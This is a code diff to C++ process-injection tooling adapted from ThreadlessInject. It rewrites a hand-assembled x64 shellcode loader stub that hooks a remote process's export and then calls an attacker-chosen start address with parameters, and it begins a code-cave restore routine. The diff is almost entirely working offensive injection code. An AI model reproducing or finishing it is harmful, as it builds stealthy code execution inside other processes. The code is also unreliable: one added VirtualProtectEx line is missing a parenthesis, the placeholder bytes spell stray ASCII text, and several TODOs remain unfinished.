@@ -967,7 +967,7 @@ bool HandleCleanup(HANDLE hProcess, std::vector<LPVOID> remoteAddrs, LPVOID loca
 }
 
 // see github.com/CCob/ThreadlessInject
-bool DoHookForThreadless(HANDLE hProc, std::vector<byte> payload, bool debug) {
+bool DoHookForThreadless(HANDLE hProc, LPVOID lpStart, LPVOID lpParameters, bool debug) {
 
     // TODO find function to hook
     DWORD64 originalInstructions_0_8 = 0;
@@ -992,22 +992,32 @@ bool DoHookForThreadless(HANDLE hProc, std::vector<byte> payload, bool debug) {
         /* 0040 */ 0xDD, 0xDD, 0xCC, 0xCC, 0xAA, 0xAA, 0x99, 0x99, 0x48, 0x89, 0x03, 0xB8, 0x09, 0x09, 0x09, 0x09,
         /* 0050 */ 0x89, 0x43, 0x08, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x8B, 0xCB, 0x48, 0xC7, 0xC2, 0x0C, 0x00, 0x00,
         /* 0060 */ 0x00, 0x49, 0xC7, 0xC0, 0x20, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x0C, 0x24, 0xFF, 0xD6, 0x48, 0x83,
-        /* 0070 */ 0xC4, 0x28, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41,
-        /* 0080 */ 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x5E, 0x53, 0xC3 // actual payload is appended here
+        /* 0070 */ 0xC4, 0x28, 0x48, 0x83, 0xEC, 0x40, // here was the old `call payload` from ThreadlessInject, but I need to call lpStart
+
+        // --- set up RCX with lpParameters and RAX with lpStart, then call RAX -> lpStart(lpParameters) ---
+
+        /* 0076 */ 0x48, 0xB9, 0x2f, 0x6d, 0x6e, 0x74, 0x2f, 0x61, 0x69, 0x6e, // movabs rcx, lpParameters (patched below)
+        /* 0080 */ 0x48, 0xB8, 0x77, 0x61, 0x73, 0x20, 0x68, 0x65, 0x72, 0x65, // movabs rax, lpStart      (patched below)
+        /* 008A */ 0xFF, 0xD0,                                                 // call rax
+
+        /* 008C */ 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x5E, 0x53, 0xC3 // cleanup, same as before
     };
 
-    // Patch the hooked function address into the shellcode loader stub
+    // 1. Patch the hooked function address into the shellcode loader stub
     *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x0D) = hookedFuncAddr;
 
-    // Patch the VirtualProtect address into the shellcode loader stub
+    // 2. Patch the VirtualProtect address into the shellcode loader stub
     *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x17) = virtProtAddr;
 
-    // Patch the 12 bytes that were in the original export prior to hooking
+    // 3. Patch the 12 bytes that were in the original export prior to hooking
     *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x40) = originalInstructions_0_8;
     *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x4C) = originalInstructions_8_B;
 
-    // Append payload
-    shellcodeLoader.insert(shellcodeLoader.end(), payload.begin(), payload.end());
+    // 4. Patch lpParameters into RCX (offset 0x78)
+    *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x78) = (DWORD64)lpParameters;
+
+    // 5. Patch lpStart into RAX (offset 0x82)
+    *reinterpret_cast<DWORD64*>(shellcodeLoader.data() + 0x82) = (DWORD64)lpStart;
 
     if (debug)
         printf("[+] Patched and prepared the threadless loader locally\n");
@@ -1018,9 +1028,14 @@ bool DoHookForThreadless(HANDLE hProc, std::vector<byte> payload, bool debug) {
     bool foundCodeCave = false;
     struct CodeCave {
         LPVOID address;
+        DWORD flProtect;
         std::vector<byte> originalBytes;
     };
     auto revertCodeCave = [&](CodeCave cc) {
+        DWORD oldProt = 0;
+        if (!VirtualProtectEx(hProc, cc.address, cc.originalBytes.size(), PAGE_READWRITE, &oldProt) {
+            return;
+        }
         // TODO unprotect
         // TODO write original
     };
